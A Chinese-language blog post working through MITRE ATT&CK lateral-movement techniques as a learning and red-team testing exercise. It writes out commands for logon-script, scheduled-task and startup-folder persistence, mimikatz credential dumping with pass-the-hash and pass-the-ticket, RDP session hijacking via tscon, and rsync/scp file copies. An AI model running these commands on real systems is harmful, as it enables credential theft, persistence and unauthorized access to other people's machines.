---
layout: post
title: 跟着ATT&CK学安全之lateral-movement
excerpt: "跟着ATT&CK学安全之lateral-movement"
categories: [ATT&CK]
comments: true
---
### Application Deployment Software
攻击者可以通过企业管理员账号进行软件下发,来进行横向移动,或者persistence

这个没法复现
### T1037 - Logon Scripts
通过修改远程的Logon Scripts脚本来进行横向移动
###### 测试1 Logon Scripts
```
echo cmd /c "#{script_command}" > #{script_path}
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_SZ /d "#{script_path}"
```
win10成功复现
###### 测试2 使用调度系统添加Logon自启动
```
schtasks /create /tn "T1037_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe"
schtasks /create /tn "T1037_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe"
```
win10成功复现
###### 测试3 Supicious bat file run from startup Folder
就是把文件放在了startup文件夹中
```
Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Copy-Item $PathToAtomicsFolder\T1037\src\batstartup.bat "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
Start-Process "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\batstartup.bat"
Start-Process "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\batstartup.bat"
```
win10成功复现
#### T1075 - Pass the Hash
这项技术不需要红队获得密码明文,这个技术绕过了标准的权限认证步骤,直接到hash验证的部分,win7或者高于KB2871997需要域名用户凭证,或者RID 500 administrator hash
###### 测试 
首先用这个方法把密码hash dump出来**(mimikatz现在也可以显示明文了!!!!!)**
```
privilege::debug
sekurlsa::logonpasswords
```
然后
```
mimikatz # sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}
```
成功复现
###### 测试2 crackmapexec Pass the Hash
这个是一个竞品,暂时跳过
### T1097 - Pass the Ticket
pass the ticket是使用Kerberos tickets而不需要账户密码获得权限.Kerberos验证通常被用来当作横向移动的第一步.这种技术需要获取有效的Kerberos ticket和有效的账户
###### 测试1 Mimikatz Kerberos Ticket Attack
```
mimikatz # kerberos::ptt #{user_name}@#{domain}
```
更多内容见:https://blog.csdn.net/citelao/article/details/50947685
### T1077 - Windows Admin Shares
windows系统有一个隐藏的网络分享,它只在administrator用户可见,并且提供了远程文件复制等功能.红队可以使用这个技术结合administrator等级的账号使用SMB协议进行远程控制.

**之后再补充**
### T1076 - Remote Desktop Protocol
远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录到交互式会话。Microsoft将其对远程桌面协议（RDP）的实现称为远程桌面服务（RDS）。

如果启用了服务并允许访问具有已知凭据的帐户，则攻击者可以通过RDP / RDS连接到远程系统以扩展访问权限。攻击者可能会使用凭据访问技术来获取与RDP一起使用的凭据。攻击者还可以结合使用RDP和可访问性功能技术来实现持久性。

攻击者还可能执行RDP会话劫持，其中涉及窃取合法用户的远程会话。通常情况下当其他人试图窃取其会话(可以理解为windows的快速切换用户功能)时会收到问题提示并要求出示密码。凭借系统权限(SYSTEM权限)的终端服务控制台c:\windows\system32\tscon.exe [session number to be stolen]，攻击者可以切换会话而无需输入密码。这可能导致攻击者窃取域管理员或更高特权的账户会话。











#### T1105 - Remote File Copy
##### 测试1 rsync remote file copy (push)
平台:linux
`rsync -r #{local_path} #{username}@#{remote_host}:#{remote_path}`
##### 测试2 rsync remote file copy (pull)
平台:linux
`rsync -r #{username}@#{remote_host}:#{remote_path} #{local_path}`
##### 测试3 scp remote file copy (push)
平台:linux
`scp #{local_file} #{username}@#{remote_host}:#{remote_path}`
##### 测试4 scp remote file copy (pull)
平台:linux
`scp #{username}@#{remote_host}:#{remote_file} #{local_path}`
方法很多,未完待续

